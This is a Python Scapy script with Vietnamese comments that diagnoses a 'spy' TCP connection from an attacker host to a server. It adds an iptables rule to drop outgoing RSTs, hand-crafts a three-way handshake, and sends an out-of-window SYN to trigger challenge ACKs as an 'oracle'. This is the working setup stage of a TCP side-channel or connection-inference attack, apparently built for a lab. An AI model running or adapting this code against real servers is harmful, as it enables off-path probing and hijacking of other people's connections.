#!/usr/bin/env python3
"""
spy_test.py — Kiểm tra từng bước spy connection
Chạy trên Attacker: sudo python3 spy_test.py
"""
from scapy.all import IP, TCP, sr1, send, sniff, AsyncSniffer
import random, sys

ATTACKER_IP  = "2.2.2.20"
SERVER_IP    = "1.1.1.10"
SERVER_PORT  = 8080
SPY_PORT     = 55555
IFACE        = "ens33"

print("=" * 50)
print("  SPY CONNECTION DIAGNOSTICS")
print("=" * 50)

# ── STEP 1: Ping Server ──────────────────────────
import subprocess
r = subprocess.run(["ping", "-c1", "-W1", SERVER_IP], capture_output=True)
ok = r.returncode == 0
print(f"\n[1] Ping {SERVER_IP}: {'OK ✓' if ok else 'FAIL ✗ — Kiểm tra route/Backbone'}")
if not ok:
    sys.exit(1)

# ── STEP 2: iptables RST DROP ────────────────────
r2 = subprocess.run(["iptables", "-C", "OUTPUT", "-p", "tcp",
                     "--tcp-flags", "RST,RST", "RST",
                     "-s", ATTACKER_IP, "-j", "DROP"],
                    capture_output=True)
has_drop = r2.returncode == 0
print(f"[2] iptables RST DROP: {'OK ✓' if has_drop else 'MISSING ✗ — Thêm rule'}")
if not has_drop:
    print(f"    → sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {ATTACKER_IP} -j DROP")

# ── STEP 3: Gửi SYN → Server ────────────────────
print(f"\n[3] Gửi SYN → {SERVER_IP}:{SERVER_PORT} (sport={SPY_PORT})...")
isn = random.randint(1000, 50000)
syn = IP(src=ATTACKER_IP, dst=SERVER_IP) / TCP(sport=SPY_PORT, dport=SERVER_PORT, flags="S", seq=isn)
resp = sr1(syn, iface=IFACE, timeout=3, verbose=False)

if resp is None:
    print("    FAIL ✗ — Không nhận SYN-ACK")
    print("    Nguyên nhân có thể:")
    print("    a) server.py chưa chạy")
    print("    b) Route không đúng (ip route get 1.1.1.10)")
    print("    c) iptables trên Server block SYN")
    sys.exit(1)

if TCP not in resp:
    print(f"    FAIL ✗ — Nhận gói không phải TCP: {resp.summary()}")
    sys.exit(1)

flags = resp[TCP].flags
if flags & 0x12:  # SYN+ACK
    spy_seq = isn + 1
    spy_ack = resp[TCP].seq + 1
    print(f"    OK ✓ — SYN-ACK nhận được (Server seq={resp[TCP].seq})")
    print(f"    spy_seq={spy_seq}, spy_ack={spy_ack}")
    src_ip = resp[IP].src
    print(f"    Server thấy connection từ: {resp[IP].dst}:{SPY_PORT} → {src_ip}:{SERVER_PORT}")
else:
    print(f"    FAIL ✗ — Nhận cờ không mong đợi: {flags}")
    sys.exit(1)

# ── STEP 4: Gửi ACK (hoàn thành 3-way handshake) ─
ack = IP(src=ATTACKER_IP, dst=SERVER_IP) / TCP(sport=SPY_PORT, dport=SERVER_PORT,
         flags="A", seq=spy_seq, ack=spy_ack)
send(ack, iface=IFACE, verbose=False)
print("[4] ACK gửi → 3-way handshake hoàn thành ✓")

# ── STEP 5: Probe (SYN trên established) ─────────
print("\n[5] Probe spy (SYN trên established connection)...")
import time
time.sleep(0.1)

bpf = f"src host {SERVER_IP} and src port {SERVER_PORT} and dst host {ATTACKER_IP} and dst port {SPY_PORT}"
sniffer = AsyncSniffer(iface=IFACE, count=1, timeout=1.0, filter=bpf)
sniffer.start()
time.sleep(0.05)

probe = IP(src=ATTACKER_IP, dst=SERVER_IP) / TCP(sport=SPY_PORT, dport=SERVER_PORT,
           flags="S", seq=spy_seq + 999999)
send(probe, iface=IFACE, verbose=False)
sniffer.join()

if sniffer.results:
    pkt = sniffer.results[0]
    print(f"    Challenge ACK nhận được ✓")
    print(f"    ACK flags={pkt[TCP].flags}, seq={pkt[TCP].seq}, ack={pkt[TCP].ack}")
    print("\n[✓] SPY HOẠT ĐỘNG — Oracle sẵn sàng!")
else:
    print("    FAIL ✗ — Không nhận Challenge ACK")
    print("    Nguyên nhân: iptables RST DROP chưa có hoặc timeout quá ngắn")
    print(f"\n[!] Kiểm tra lại rule: sudo iptables -L OUTPUT | grep RST")
